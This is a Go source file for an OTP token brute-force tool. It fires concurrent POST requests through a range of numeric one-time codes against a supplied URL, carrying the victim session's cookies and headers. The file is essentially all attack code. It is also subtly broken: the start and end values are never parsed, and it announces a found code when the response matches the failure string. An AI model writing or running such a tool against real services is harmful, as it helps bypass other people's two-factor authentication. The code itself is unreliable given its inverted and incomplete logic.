package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/akamensky/argparse"
)

var (
	postURL              *string
	startNum             *int
	endNum               *int
	threads              *int
	cookies              *string
	headers              *[]string
	sleep                *int
	negativeSearchString *string
	requestContentType   *string
)

func doRequest(code int) string {
	time.Sleep(time.Duration(*sleep) * time.Millisecond)
	postBody, _ := json.Marshal(map[string]int{
		"token": code,
	})

	responseBody := bytes.NewBuffer(postBody)

	client := &http.Client{}
	request, err := http.NewRequest("POST", *postURL, responseBody)
	if err != nil {
		log.Fatal(err)
	}
	request.Header.Set("Content-Type", *requestContentType)
	for _, header := range *headers {
		parts := strings.Split(header, ":")
		request.Header.Set(parts[0], strings.Join(parts[1:], ""))
	}
	request.Header.Set("Cookie", *cookies)

	resp, err := client.Do(request)

	// Perform HTTP Post request
	if err != nil {
		log.Fatal(err)
	}

	// Read the response body
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}

	return string(body)
}

func doJob(wg *sync.WaitGroup, jobs chan int, results chan string) {
	defer wg.Done()
	for j := range jobs {

		results <- doRequest(j)
	}
}

func main() {
	parser := argparse.NewParser("go-token-brute", "A simple OTP token brute force tool")

	threads = parser.Int("t", "threads", &argparse.Options{
		Required: false,
		Help:     "Number of concurrent connections to use",
		Default:  10,
	})

	postURL = parser.String("u", "url", &argparse.Options{
		Required: true,
		Help:     "The URL of the POST request",
	})

	cookies = parser.String("c", "cookies", &argparse.Options{
		Required: false,
		Help:     "The cookies to use",
	})

	headers = parser.StringList("", "header", &argparse.Options{
		Required: false,
		Help:     "The headers to use",
	})

	sleep = parser.Int("s", "sleep", &argparse.Options{
		Required: false,
		Help:     "The number of milliseconds to sleep between requests",
		Default:  500,
	})

	requestContentType = parser.String("x", "content-type", &argparse.Options{
		Required: false,
		Help:     "The content type to use in the request",
		Default:  "application/json;charset=utf-8",
	})

	negativeSearchString = parser.String("n", "negative-search-string", &argparse.Options{
		Required: true,
		Help:     "The string to search for in the response body on a failed request (e.g. \"The provided token is invalid\")",
	})

	err := parser.Parse(os.Args)
	if err != nil {
		fmt.Print(parser.Usage(err))
		os.Exit(0)
	}

	var wg sync.WaitGroup
	jobs := make(chan int, 100)
	results := make(chan string, 100)

	go func() {
		wg.Wait()
	}()

	for j := 0; j < *threads; j++ {
		wg.Add(1)
		go doJob(&wg, jobs, results)
	}

	wg.Add(1)
	go func() {
		defer wg.Done()
		for i := *startNum; i <= *endNum; i++ {
			jobs <- i
		}
		close(jobs)
	}()

	for res := range results {
		if strings.Contains(res, *negativeSearchString) {
			fmt.Println("[+] Code Found:", res)
			close(results)
			os.Exit(0)
		}
	}
	close(results)
}
